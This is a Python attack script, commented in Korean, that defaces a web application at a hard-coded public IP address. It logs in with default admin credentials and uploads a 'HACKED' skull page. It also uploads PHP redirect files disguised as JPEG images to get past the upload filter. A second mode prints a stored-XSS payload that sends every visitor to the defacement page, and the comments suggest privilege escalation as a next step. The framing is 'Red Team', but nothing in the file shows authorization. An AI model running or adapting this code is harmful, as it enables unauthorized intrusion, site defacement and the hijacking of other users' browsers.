#!/usr/bin/env python3
"""
업로드 기능을 통한 Defacement
권한 문제를 우회하여 uploads/ 디렉토리 활용
"""

import requests
import time

TARGET = "http://52.78.221.104"
LOGIN_URL = f"{TARGET}/login.php"
UPLOAD_URL = f"{TARGET}/upload.php"

# 관리자 계정
USERNAME = "admin"
PASSWORD = "admin123"

# 짧은 hacked.html
HACKED_HTML = """<!DOCTYPE html><html><head><meta charset="utf-8"><title>HACKED</title><style>*{margin:0;padding:0}body{background:#000;color:#0f0;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;text-align:center}.skull{font-size:10px;line-height:1;white-space:pre}h1{font-size:3em;color:#f00;animation:b .5s infinite}@keyframes b{0%,100%{opacity:1}50%{opacity:.3}}</style></head><body><div><div class="skull">    _.--""-._
 ."         ".
/             \\
|,  .-.  .-.  ,|
| )(__/  \\__)( |
|/     /\\     \\|
(_     ^^     _)
 \\____________/</div><h1>HACKED</h1><p style="margin:20px 0">SYSTEM COMPROMISED</p><p>[SQL Injection: BYPASSED]<br>[File Upload: EXPLOITED]<br>[XSS: INJECTED]<br>[CSRF: EXECUTED]<br>[Database: COMPROMISED]</p><p style="margin-top:20px">-- Red Team --</p></div></body></html>"""

# 리다이렉트 PHP 코드
REDIRECT_PHP = """<?php header("Location: /uploads/hacked.html"); exit; ?>"""

def login():
    """로그인하여 세션 획득"""
    session = requests.Session()

    data = {
        'username': USERNAME,
        'password': PASSWORD
    }

    response = session.post(LOGIN_URL, data=data)

    if 'admin' in response.text or response.status_code == 302:
        print("[+] Login successful")
        return session
    else:
        print("[-] Login failed")
        return None

def upload_file(session, filename, content, content_type="text/html"):
    """파일 업로드"""
    files = {
        'file': (filename, content, content_type)
    }

    response = session.post(UPLOAD_URL, files=files)

    if 'uploaded' in response.text.lower() or response.status_code == 200:
        print(f"[+] Uploaded: {filename}")
        return True
    else:
        print(f"[-] Failed to upload: {filename}")
        return False

def deploy_defacement():
    """Defacement 배포"""
    print("=" * 60)
    print("💀 Defacement via Upload Directory")
    print("=" * 60)
    print()

    # 로그인
    print("[*] Logging in as admin...")
    session = login()
    if not session:
        return False

    time.sleep(0.5)

    # Step 1: hacked.html 업로드 (uploads/ 디렉토리에)
    print("[*] Step 1: Uploading hacked.html...")
    if not upload_file(session, "hacked.html", HACKED_HTML, "text/html"):
        print("[-] Failed to upload hacked.html")
        return False

    time.sleep(0.5)

    # Step 2: 리다이렉트 PHP 파일들 업로드
    print("[*] Step 2: Uploading redirect PHP files...")

    php_files = [
        "index.php",
        "login.php",
        "profile.php",
        "register.php",
        "new_post.php"
    ]

    for php_file in php_files:
        # PHP 파일을 이미지로 위장하여 업로드
        fake_filename = php_file.replace('.php', '.jpg')
        upload_file(session, fake_filename, REDIRECT_PHP, "image/jpeg")
        time.sleep(0.3)

    print()
    print("=" * 60)
    print("✅ FILES UPLOADED")
    print("=" * 60)
    print()
    print("Uploaded files:")
    print(f"  • {TARGET}/uploads/hacked.html")
    print()
    print("⚠️  Note: uploads/ 디렉토리에만 쓰기 권한이 있습니다.")
    print("    전체 사이트 장악을 위해서는 root 권한이 필요합니다.")
    print()
    print("Alternative approach:")
    print("  1. uploads/hacked.html을 직접 공유")
    print("  2. XSS로 모든 페이지에서 iframe으로 로드")
    print("  3. 더 높은 권한 획득 시도 (privilege escalation)")
    print()

def create_xss_redirect():
    """XSS를 통한 리다이렉트 페이로드 생성"""
    xss_payload = f"""<script>
if (!localStorage.getItem('hacked')) {{
    localStorage.setItem('hacked', '1');
    window.location.href = '{TARGET}/uploads/hacked.html';
}}
</script>"""

    print("=" * 60)
    print("🎯 Alternative: XSS Redirect Payload")
    print("=" * 60)
    print()
    print("게시물에 아래 코드를 올리면 모든 사용자가 해골 페이지로 리다이렉트됩니다:")
    print()
    print(xss_payload)
    print()

if __name__ == "__main__":
    import sys

    if len(sys.argv) > 1 and sys.argv[1] == "xss":
        create_xss_redirect()
    else:
        deploy_defacement()
